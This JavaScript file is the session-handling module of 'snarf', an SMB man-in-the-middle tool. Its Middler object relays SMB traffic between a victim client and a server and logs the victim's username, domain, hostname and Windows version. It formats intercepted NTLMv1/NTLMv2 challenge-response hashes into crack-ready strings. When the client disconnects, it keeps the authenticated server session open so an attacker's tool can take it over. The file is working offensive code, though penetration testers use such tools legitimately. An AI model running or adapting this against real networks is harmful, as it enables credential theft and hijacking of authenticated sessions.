//
// snarf - SMB man-in-the-middle tool
// Copyright (C) 2013 Josh Stone (yakovdk@gmail.com)
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
// 
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// 
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
//
// ------------------------------------------------------------------------

var net    = require("net");
var smb    = require("./smb.js");
var out    = require ("./out.js");
var moment = require("moment");

function Middler(id) {
    var client;
    var server;
    var reqPackets  = [];
    var respPackets = [];
    var hackercount = 0;
    var broker = undefined;
    var myself = this;
    var clientIP;
    var clientPort;
    var serverIP;
    var collectPackets = false;
    var domain = "unknown";
    var username = "unknown";
    var hostname = "unknown";
    var winver = "unknown";
    var smb_userid;
    var smb_challenge = "unknown";
    var smb_hash = "unknown";
    var smb_htype = "unknown";
    var freshness = moment();
    var active = true;

    this.expired = false;

    this.setActive = function(state) {
	active = state;
    }

    this.getActive = function() {
	return active;
    }

    this.freshen = function() {
	freshness = moment();
    }

    this.getFreshness = function() {
	return freshness;
    }

    this.shutdown = function() {
	out.red("Can't shutdown session that hasn't been setup yet");
    }

    this.getID = function() {
	return id;
    }

    this.getRespPackets = function() {
	return respPackets;
    }
    
    this.getReqPackets = function() {
	return reqPackets;
    }

    this.getClient = function() {
	return client;
    }

    this.getServer = function() {
	return server;
    }

    this.getDomain = function() {
	return domain;
    }

    this.setDomain = function(name) {
	domain = name;
    }

    this.getHostname = function() {
	return hostname;
    }
    
    this.setHostname = function(name) {
	hostname = name;
    }

    this.getUsername = function() {
	return username;
    }

    this.setUsername = function(name) {
	username = name;
    }

    this.getWinVer = function() {
	return winver;
    }

    this.setWinVer = function(version) {
	winver = version;
    }

    this.getSMBUserID = function() {
        return smb_userid;
    }

    this.setSMBUserID = function(id) {
	smb_userid = id;
    }

    this.setSMBChallenge = function(challenge) {
	smb_challenge = challenge;
    }

    this.getHash = function() {
        var hash = "unknown"
        switch(smb_htype) {
        case "NTLMv1":
            hash = username + "::" + domain + ":" + smb_hash + ":" + smb_challenge;
            break;
        case "NTLMv2":
            hash = username + "::" + domain + ":" + smb_challenge + ":" + smb_hash;
            break;
        }
        return hash;
    }

    this.setHash = function(hash) {
	smb_hash = hash;
    }

    this.getHashType = function() {
	return smb_htype;
    }

    this.setHashType = function(hashtype) {
	smb_htype = hashtype;
    }

    this.getClientAddr = function() {
	return clientIP;
    }

    this.getServerAddr = function() {
	return serverIP;
    }

    this.getClientPort = function() {
	return clientPort;
    }

    this.setID = function(i) {
	id = i;
    }

    this.setClientInfo = function(addr, port, dest) {
	clientIP = addr;
	clientPort = port;
	serverIP = dest;
    }

    this.setBroker = function(b) {
	broker = b;
    }

    this.setClient = function(s) {
	client = s;
    }

    this.terminate = function() {
	if(server) server.end();
    }

    this.expire = function() {
	this.shutdown();
    }

    // The server component is actually a client socket connected to
    // the distant SMB server.  I know, using a client socket to
    // represent a server is awkward, but it's not a simple
    // arrangement anyway.  This code primarily shuffles responses
    // from the SMB server back to the appropriate client process.

    this.setServer = function(val) {
        var myself = this;
        server = val;

        server.on('data', function(x) {
	    var packet = broker.parsePacket(x);
            // var packet = new smb.SMBPacket(x);
	    if(myself.collectPackets) {
		respPackets.push(packet);
	    }
	    if(packet.commandCode != 0x2b) {
		out.darkgreen("[" + myself.getID() + "] Server: " + packet.describe());
	    }

	    broker.reviewServerPacket(packet, client, myself);
        });

        server.on('end', function(data) {
	    out.red("Encountered 'end' event from server");
	    broker.deactivateMiddler(id);
        });

	server.on('error', function(data) {
	    server.pause();

	    out.red("Encountered error from server");
	    broker.deactivateMiddler(id);
	});
    }

    // We need to trap some authenticated session.  This is the
    // "originalClient".  About the only thing that makes this
    // different from a port redirector is that when the connection
    // dies, we find a hacker tool to substitute.

    this.setOriginalClient = function(val) {
	var myself = this;
        client = val;

	this.shutdown = function() {
	    myself.expired = true;
	    out.red("Activating middler");
	    broker.activateMiddler(myself);
	    client.end();
	    if(client) {
	    	out.red("Destroying client socket!");
	    	client.destroy();
	    }
            client = undefined;
	    server.resume();
	}

        client.on('data', function(x) {
	    var packet = broker.parsePacket(x);
            // var packet = new smb.SMBPacket(x);
	    if(myself.collectPackets) {
		reqPackets.push(packet);
	    }
            out.green("[" + myself.getID() + "] Client: " + packet.describe());
	    broker.reviewClientPacket(packet, server, myself);
        });

	client.on("error", function() {
	    server.pause();
	    myself.shutdown();
	});

        client.on('end', function() {
	    server.pause();
	    myself.shutdown();
        });
    }

}

module.exports.NullMiddler = function(x) {
    x.on('data', function(x) {
	out.red("Shouldn't get data");
    });

    x.on('error', function() {
	out.red("Shouldn't get errors");
    });

    x.on('end', function() {
	out.red("Closing down socket\n");
    });
}

module.exports.Middler = Middler;

